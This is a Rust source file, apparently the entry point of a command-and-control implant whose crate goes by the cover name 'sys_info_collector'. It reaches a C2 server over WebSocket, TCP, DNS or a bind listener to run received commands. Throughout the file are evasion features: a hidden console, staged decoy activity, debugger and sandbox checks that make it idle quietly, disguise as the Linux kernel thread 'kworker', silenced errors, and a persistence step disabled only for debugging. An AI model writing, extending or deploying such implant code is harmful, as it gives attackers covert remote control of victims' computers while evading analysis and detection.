// C2 Client Agent - 主程序入口
// 
// 这是一个轻量级的 C2 受控端程序，通过多种传输协议连接到服务端，
// 接收并执行命令，然后将结果返回给服务端。
//
// 核心特性：
// - 多协议支持（WebSocket、TCP、DNS 等）
// - 条件编译：使用 Cargo Features 按需编译协议
// - 指数退避自动重连
// - 零 panic 错误处理
// - 跨平台命令执行
// - 异步 I/O
// - 可修补的服务器配置

// Windows: 隐藏控制台窗口，不弹出黑色 CMD 窗口（生产版本必须启用）
#![cfg_attr(target_os = "windows", windows_subsystem = "windows")]
 
 #[allow(unused_imports)]
 use sys_info_collector::{ClientError, Result, stealth, Transport};
 #[allow(unused_imports)]
 use log::{error, info};
 
 fn main() {
    // ⚡ OPSEC: 关闭控制台日志
    /*
    if std::env::var("RUST_LOG").is_err() {
        std::env::set_var("RUST_LOG", "debug");
    }
    let _ = env_logger::try_init();
    */

     // 0. Initial random delay
     use rand::Rng;
     let delay = rand::thread_rng().gen_range(1..5); 
     // println!("[*] Agent starting... (Debug delay: {}s)", delay);
     std::thread::sleep(std::time::Duration::from_secs(delay));
 
     // ⚡ STEALTH: Sequence re-ordering to mimic legitimate system components
    // 1. [Benign] Initial pattern load (looks like config parsing)
    for _ in 0..3 {
        // Mock legitimate-looking initialization
        sys_info_collector::utils::junk_data_collector();
        std::thread::sleep(std::time::Duration::from_millis(500));
    }

    // 2. [Anti-Analysis] Silent divergence instead of hard exit
    // Hard exits (exit(0)) on detection are a huge red flag for sandbox analysis
    if stealth::is_debugger_present() || stealth::is_sandbox() {
        // Pretend to be a diagnostic tool doing nothing
        loop { std::thread::sleep(std::time::Duration::from_secs(3600)); }
    }

    // 3. [Benign] Standard Windows API warming 
    stealth::perform_system_sanity_check();
    stealth::verify_disk_integrity();

    // 4. [Stealth] Delayed Window Hide (Reduced heuristic trigger)
    std::thread::sleep(std::time::Duration::from_secs(2));
    stealth::hide_console();

    // 5. [Benign] Final environment prep
    stealth::check_network_config();

    // 9. Backgrounding and Name Spoofing (Linux)
    #[cfg(target_os = "linux")]
    {
        stealth::spoof_process_name("kworker/u2:1-events");
    }

    // 10. Runtime Start
    let rt = tokio::runtime::Builder::new_multi_thread()
        .enable_all()
        .build()
        .unwrap();

    rt.block_on(async {
        let res = run().await;
        if let Err(_e) = res {
            // Silent failure: 生产版本不向控制台输出任何错误
        }
    });
}

/// 主运行逻辑
/// 
/// 根据编译时启用的 feature 选择相应的协议入口点
async fn run() -> Result<()> {
    // Use customized logging to look like a standard system component
    if std::env::var("SERVICE_MODE").is_ok() {
        let _ = env_logger::builder()
            .parse_filters("info")
            .format_timestamp(None)
            .try_init();
    }
    
    // 💤 1. Sleep Delay
    let sleep_secs = sys_info_collector::config::get_sleep_time();
    if sleep_secs > 0 {
        tokio::time::sleep(tokio::time::Duration::from_secs(sleep_secs)).await;
    }

    // 🆔 预计算并缓存 Agent UUID（供后续注册使用）
    sys_info_collector::get_agent_uuid();
    
    // 🏠 Persistence (Disabled for Debugging - will be re-enabled in production)
    /*
    if stealth::clone_and_hide() {
        std::process::exit(0);
    }
    */
    
    // 1️⃣ WebSocket Entry Point
    #[cfg(feature = "ws")]
    {
        return run_websocket_mode().await;
    }
    
    // 2️⃣ TCP Entry Point (Medium Priority)
    #[cfg(all(feature = "tcp", not(feature = "ws")))]
    {
        return run_tcp_mode().await;
    }
    
    // 3️⃣ DNS Entry Point (Lowest Priority)
    #[cfg(all(feature = "dns", not(any(feature = "ws", feature = "tcp", feature = "tcp_bind"))))]
    {
        return run_dns_mode().await;
    }

    // 4️⃣ TCP Bind Entry Point (New)
    #[cfg(feature = "tcp_bind")]
    {
        info!("Running in TCP Bind (Forward) mode");
        return run_bind_mode().await;
    }
    
    // ⚠️ Safety check: What if no feature is selected?
    #[cfg(not(any(feature = "ws", feature = "tcp", feature = "dns", feature = "tcp_bind")))]
    {
        return Err(ClientError::ConnectionError(
            "no_protocol".to_string()
        ));
    }
}

/// WebSocket 模式运行逻辑
#[cfg(feature = "ws")]
#[allow(dead_code)]
async fn run_websocket_mode() -> Result<()> {
    use sys_info_collector::config::{get_server_url, validate_server_url};
    use sys_info_collector::handler::MessageHandler;
    use sys_info_collector::transport::create_transport;
    
    let server_url = get_server_url();
    // println!("[*] Target C2 Server: {}", server_url);
    
    if !validate_server_url(&server_url) {
        return Err(ClientError::ConnectionError("invalid_target".to_string()));
    }
    
    let mut transport: Box<dyn Transport> = match create_transport(&server_url) {
        Ok(t) => t,
        Err(e) => return Err(e),
    };
    
    // 使用指数退避重连策略（1s -> 2s -> 4s -> ... -> 60s）
    let mut backoff = sys_info_collector::ExponentialBackoff::new();
    
    loop {
        if let Err(_e) = transport.connect().await {
            // 连接失败：使用指数退避等待，防止固定间隔被流量分析识别
            tokio::time::sleep(backoff.next_delay()).await;
            continue;
        }
        
        // 连接成功：重置退避计时器
        backoff.reset();
        
        let handler = MessageHandler::new(transport);
        match handler.run().await {
            Ok(returned_transport) => {
                transport = returned_transport;
            }
            Err(_e) => {
                match create_transport(&server_url) {
                    Ok(t) => transport = t,
                    Err(e) => return Err(e),
                }
            }
        }
        // Session 断开：短暂等待后重连
        tokio::time::sleep(tokio::time::Duration::from_secs(2)).await;
    }
}

/// TCP 模式运行逻辑
#[cfg(feature = "tcp")]
#[allow(dead_code)]
async fn run_tcp_mode() -> Result<()> {
    use sys_info_collector::config::get_server_url;
    use sys_info_collector::handler::MessageHandler;
    use sys_info_collector::transport::{create_transport, Transport};
    
    // 获取服务器 URL
    let server_url = get_server_url();
    
    // 构造 TCP URL
    // 支持多种输入格式： 
    // 1. "127.0.0.1:8080" -> "tcp://127.0.0.1:8080"
    // 2. "tcp://127.0.0.1:8080" -> "tcp://127.0.0.1:8080"
    // 3. "ws://127.0.0.1:8080/ws" -> "tcp://127.0.0.1:8080"
    let mut clean_url = server_url.clone();
    
    // 移除已知的协议前缀
    if clean_url.starts_with("ws://") {
        clean_url = clean_url.replace("ws://", "");
    } else if clean_url.starts_with("wss://") {
        clean_url = clean_url.replace("wss://", "");
    } else if clean_url.starts_with("tcp://") {
        clean_url = clean_url.replace("tcp://", "");
    }

    // 如果包含路径 (例如 /ws)，只保留主机和端口部分
    if let Some(pos) = clean_url.find('/') {
        clean_url = clean_url[..pos].to_string();
    }
    
    // 最终组合成标准的 tcp://host:port
    let tcp_url = format!("tcp://{}", clean_url);
    
    info!("TCP Configuration:");
    info!("  Original URL: {}", server_url);
    info!("  Final TCP URL: {}", tcp_url);
    info!("===========================================");
    
    // 创建 TCP 传输层
    let mut transport: Box<dyn Transport> = match create_transport(&tcp_url) {
        Ok(t) => {
            info!("TCP transport layer created successfully");
            t
        }
        Err(e) => {
            error!("Failed to create TCP transport: {}", e);
            return Err(e);
        }
    };
    
    // "永生"循环
    loop {
        if let Err(_) = transport.connect().await {
            tokio::time::sleep(tokio::time::Duration::from_secs(15)).await;
            continue;
        }
        
        let handler = MessageHandler::new(transport);
        
        match handler.run().await {
            Ok(returned_transport) => {
                transport = returned_transport;
            }
            Err(_) => {
                loop {
                    match create_transport(&tcp_url) {
                        Ok(t) => {
                            transport = t;
                            break;
                        }
                        Err(_) => {
                            tokio::time::sleep(tokio::time::Duration::from_secs(30)).await;
                        }
                    }
                }
            }
        }
        
        tokio::time::sleep(tokio::time::Duration::from_secs(5)).await;
    }
}

/// DNS 模式运行逻辑
#[cfg(feature = "dns")]
#[allow(dead_code)]
async fn run_dns_mode() -> Result<()> {
    use sys_info_collector::config::{get_dns_resolver, get_server_url};
    use sys_info_collector::handler::MessageHandler;
    use sys_info_collector::transport::{create_transport, Transport};
    
    // 获取服务器 URL
    let server_url = get_server_url();
    
    // 显示 DNS 配置
    info!("DNS Configuration:");
    info!("  Domain: {}", server_url);
    
    if let Some(_resolver) = get_dns_resolver() {
        // DNS resolver configured
    } else {
        // Using default DNS resolver
    }
    
    info!("===========================================");
    
    // 构造 DNS URL
    // 支持多种输入格式：
    // 1. "example.com" -> "dns://example.com"
    // 2. "dns://example.com" -> "dns://example.com"
    // 3. "ws://example.com/ws" -> "dns://example.com"
    let mut clean_url = server_url.clone();
    
    // 移除已知的协议前缀
    if clean_url.starts_with("ws://") {
        clean_url = clean_url.replace("ws://", "");
    } else if clean_url.starts_with("wss://") {
        clean_url = clean_url.replace("wss://", "");
    } else if clean_url.starts_with("dns://") {
        clean_url = clean_url.replace("dns://", "");
    }

    // 如果包含路径 (例如 /ws)，只保留主机部分
    if let Some(pos) = clean_url.find('/') {
        clean_url = clean_url[..pos].to_string();
    }
    
    // 最终组合成标准的 dns://domain
    let dns_url = format!("dns://{}", clean_url);
    
    // 创建 DNS 传输层
    let mut transport: Box<dyn Transport> = match create_transport(&dns_url) {
        Ok(t) => {
            info!("DNS transport layer created successfully");
            t
        }
        Err(e) => {
            error!("Failed to create DNS transport: {}", e);
            return Err(e);
        }
    };
    
    // "永生"循环
    loop {
        if let Err(_) = transport.connect().await {
            tokio::time::sleep(tokio::time::Duration::from_secs(30)).await;
            continue;
        }
        
        let handler = MessageHandler::new(transport);
        
        match handler.run().await {
            Ok(returned_transport) => {
                transport = returned_transport;
            }
            Err(_) => {
                loop {
                    match create_transport(&dns_url) {
                        Ok(t) => {
                            transport = t;
                            break;
                        }
                        Err(_) => {
                            tokio::time::sleep(tokio::time::Duration::from_secs(60)).await;
                        }
                    }
                }
            }
        }
        
        tokio::time::sleep(tokio::time::Duration::from_secs(10)).await;
    }
}
/// TCP Bind (正向监听) 模式运行逻辑
#[cfg(feature = "tcp_bind")]
async fn run_bind_mode() -> Result<()> {
    use sys_info_collector::config::get_server_url;
    use sys_info_collector::handler::MessageHandler;
    use sys_info_collector::transport::{create_transport, Transport};

    // 在 Bind 模式下，"Server URL" 实际上解析为监听地址，例如 "0.0.0.0:4444"
    let bind_addr = get_server_url();
    let bind_url = if bind_addr.contains("://") {
        bind_addr.replace("ws://", "bind://").replace("tcp://", "bind://")
    } else {
        format!("bind://{}", bind_addr)
    };

    info!("TCP Bind Configuration:");
    info!("  Listen address: {}", bind_url);

    let mut transport: Box<dyn Transport> = create_transport(&bind_url)?;

    loop {
        info!("Waiting for incoming TCP connection...");
        if let Err(e) = transport.connect().await {
            error!("Bind listen failed: {}. Retrying in 5s...", e);
            tokio::time::sleep(tokio::time::Duration::from_secs(5)).await;
            continue;
        }

        info!("Connection accepted, starting message handler...");
        let handler = MessageHandler::new(transport);
        match handler.run().await {
            Ok(returned_transport) => {
                info!("Bind session ended normally.");
                transport = returned_transport;
            }
            Err(e) => {
                error!("Bind session error: {}. Restarting listener...", e);
                transport = create_transport(&bind_url)?;
            }
        }
    }
}
